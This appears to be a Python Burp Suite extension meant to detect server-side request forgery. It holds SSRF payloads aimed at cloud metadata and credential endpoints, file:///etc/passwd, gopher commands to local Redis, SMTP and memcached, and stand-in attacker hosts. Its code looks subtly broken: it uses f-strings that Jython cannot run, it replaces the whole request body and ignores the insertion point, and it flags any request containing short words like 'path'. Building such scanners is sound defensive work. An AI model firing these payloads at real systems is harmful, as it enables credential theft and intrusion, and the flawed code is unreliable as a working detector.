#!/usr/bin/env python3
"""
Server-Side Request Forgery (SSRF) BCheck for Burp Suite
Detects SSRF vulnerabilities in API endpoints
"""

from burp import IBurpExtender
from burp import IScannerCheck
from burp import IScanIssue
from java.net import URL
import re

class BurpExtender(IBurpExtender):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        
        # Set extension name
        callbacks.setExtensionName("SSRF BCheck")
        
        # Register scanner check
        callbacks.registerScannerCheck(SSRFCheck(callbacks, self._helpers))

class SSRFCheck(IScannerCheck):
    def __init__(self, callbacks, helpers):
        self._callbacks = callbacks
        self._helpers = helpers
        self._issue_name = "Server-Side Request Forgery (SSRF)"
        
        # SSRF test payloads
        self.ssrf_payloads = {
            'url_parameters': [
                "http://127.0.0.1",
                "http://localhost",
                "http://0.0.0.0",
                "http://[::1]",
                "http://169.254.169.254",  # AWS metadata
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal",  # GCP metadata
                "http://169.254.169.254/metadata/v1/",  # DigitalOcean metadata
                "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
                "http://192.168.1.1",
                "http://10.0.0.1",
                "http://172.16.0.1"
            ],
            'dns_payloads': [
                "http://attacker.com",
                "http://evil.com",
                "http://malicious.com",
                "http://test.com",
                "http://example.com"
            ],
            'file_protocol': [
                "file:///etc/passwd",
                "file:///etc/hosts",
                "file:///proc/version",
                "file:///sys/class/net/",
                "file:///etc/environment"
            ],
            'gopher_protocol': [
                "gopher://127.0.0.1:25/_HELO%20localhost",
                "gopher://127.0.0.1:6379/_SET%20test%20value",
                "gopher://127.0.0.1:11211/_set%20test%200%200%205%0Atest%0A"
            ]
        }
        
        # SSRF detection patterns
        self.ssrf_indicators = [
            r"root:",
            r"localhost",
            r"127\.0\.0\.1",
            r"internal",
            r"private",
            r"metadata",
            r"instance",
            r"ami-id",
            r"security-credentials"
        ]
        
        # Compile regex patterns
        self.ssrf_regex = [re.compile(pattern, re.IGNORECASE) for pattern in self.ssrf_indicators]

    def doPassiveScan(self, baseRequestResponse):
        """Passive scanning for SSRF indicators"""
        issues = []
        
        # Check for URL parameters that might be vulnerable to SSRF
        request = baseRequestResponse.getRequest()
        request_str = self._helpers.bytesToString(request)
        
        # Look for URL-related parameters
        url_params = ['url', 'uri', 'link', 'src', 'dest', 'redirect', 'next', 'target', 'path']
        for param in url_params:
            if param in request_str:
                issues.append(SSRFIssue(
                    baseRequestResponse.getHttpService(),
                    self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                    [baseRequestResponse],
                    "Potential SSRF - URL Parameter Detected",
                    f"Found URL parameter '{param}' which may be vulnerable to SSRF attacks",
                    "Medium",
                    "Low"
                ))
        
        return issues

    def doActiveScan(self, baseRequestResponse, insertionPoint):
        """Active scanning for SSRF vulnerabilities"""
        issues = []
        
        # Get the original request analysis
        request_info = self._helpers.analyzeRequest(baseRequestResponse)
        headers = request_info.getHeaders()
        
        # Test different SSRF payloads
        for payload_type, payloads in self.ssrf_payloads.items():
            for payload in payloads:
                # Create modified request with the payload
                modified_request = self._helpers.buildHttpMessage(
                    headers,
                    payload.encode('utf-8')
                )
                
                check_request_response = self._callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(),
                    modified_request
                )
                
                if check_request_response:
                    response = check_request_response.getResponse()
                    response_str = self._helpers.bytesToString(response)
                    
                    # Check for SSRF indicators
                    for pattern in self.ssrf_regex:
                        if pattern.search(response_str):
                            issues.append(SSRFIssue(
                                baseRequestResponse.getHttpService(),
                                self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                [baseRequestResponse, check_request_response],
                                f"SSRF - {payload_type.replace('_', ' ').title()}",
                                f"SSRF vulnerability detected with {payload_type} payload: {payload}",
                                "High",
                                "Medium"
                            ))
                            break
        
        return issues

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        """Consolidate duplicate issues"""
        if existingIssue.getIssueName() == newIssue.getIssueName():
            return -1
        else:
            return 0

class SSRFIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity, confidence):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity
        self._confidence = confidence

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return self._confidence

    def getIssueBackground(self):
        return "Server-Side Request Forgery (SSRF) occurs when an attacker can make the server perform requests to unintended locations, potentially accessing internal services or sensitive data."

    def getRemediationBackground(self):
        return "To prevent SSRF, implement proper URL validation, use allowlists for allowed domains, and avoid making requests to user-controlled URLs."

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        return "Implement strict URL validation, use allowlists for allowed domains, validate all user inputs, and consider using a proxy service for external requests."

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService
